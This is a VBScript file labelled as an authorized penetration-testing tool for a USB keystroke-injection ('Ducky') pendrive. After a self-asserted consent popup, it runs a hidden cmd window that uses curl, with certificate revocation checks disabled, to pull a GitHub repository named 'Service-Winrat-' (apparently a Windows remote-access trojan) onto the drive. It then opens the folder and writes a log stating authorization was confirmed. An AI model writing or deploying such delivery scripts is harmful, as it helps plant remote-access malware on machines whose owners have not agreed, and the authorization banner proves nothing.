' duckey_pentest_tool.vbs
' Authorized Penetration Testing Tool - Team Use Only

Dim objShell, strDownloads, strURL, intAgree
Set objShell = CreateObject("WScript.Shell")

' ===== CONFIGURATION =====
strURL = "https://github.com/DevevoperHCR/Service-Winrat-.git"
strDownloads = "D:\download"
strOutput = strDownloads & "\Service-Winrat-.git"

' Ensure download directory exists
CreateObject("Scripting.FileSystemObject").CreateFolder strDownloads

' ===== USER AGREEMENT =====
intAgree = objShell.Popup( _
    "PENETRATION TESTING TOOL - AUTHORIZED USE ONLY" & vbCrLf & vbCrLf & _
    "By proceeding, you confirm:" & vbCrLf & _
    "  [1] You have explicit written authorization" & vbCrLf & _
    "  [2] This is a legitimate security assessment" & vbCrLf & _
    "  [3] Team members will use data ethically" & vbCrLf & _
    "  [4] All data will be stored securely on Ducky Pendrive" & vbCrLf & _
    "  [5] Default storage location: D:\download" & vbCrLf & vbCrLf & _
    "Do you agree to proceed?", _
    6 + 32 + 4096, "Authorization Confirmation")

' intAgree: 6 = Yes, 7 = No
If intAgree = 7 Then
    objShell.Popup "Operation cancelled by user.", 3, "Cancelled", 48
    WScript.Quit
End If

' ===== DOWNLOAD VIA CMD =====
objShell.Popup "Downloading to: " & strOutput & vbCrLf & "Please wait...", 2, "Downloading", 64

objShell.Run "cmd /c curl -L --ssl-no-revoke -o """ & strOutput & """ """ & strURL & """", 0, True

' ===== VERIFY DOWNLOAD =====
Dim objFSO
Set objFSO = CreateObject("Scripting.FileSystemObject")

If objFSO.FileExists(strOutput) Then
    Dim objFile
    Set objFile = objFSO.GetFile(strOutput)
    Dim strSize
    strSize = FormatNumber(objFile.Size / 1024, 2) & " KB"
    
    objShell.Popup _
        "DOWNLOAD COMPLETE" & vbCrLf & vbCrLf & _
        "File: Service-Winrat-.git" & vbCrLf & _
        "Location: " & strOutput & vbCrLf & _
        "Size: " & strSize & vbCrLf & vbCrLf & _
        "Data stored on: Ducky Pendrive (D:\)" & vbCrLf & _
        "Team use only - authorized pentest", _
        5, "Success", 64
    
    ' Open the folder
    objShell.Run "explorer.exe /select,""" & strOutput & """", 1, False
    
    ' Log the operation
    Dim strLog
    strLog = strDownloads & "\pentest_log.txt"
    Dim objLog
    Set objLog = objFSO.CreateTextFile(strLog, True)
    objLog.WriteLine "=== PENTEST DOWNLOAD LOG ==="
    objLog.WriteLine "Date: " & Now
    objLog.WriteLine "File: " & strOutput
    objLog.WriteLine "Size: " & strSize
    objLog.WriteLine "Authorization: Confirmed by user"
    objLog.WriteLine "================================"
    objLog.Close
Else
    objShell.Popup "Download FAILED. Check URL or network.", 5, "Error", 16
End If

Set objFSO = Nothing
Set objShell = Nothing
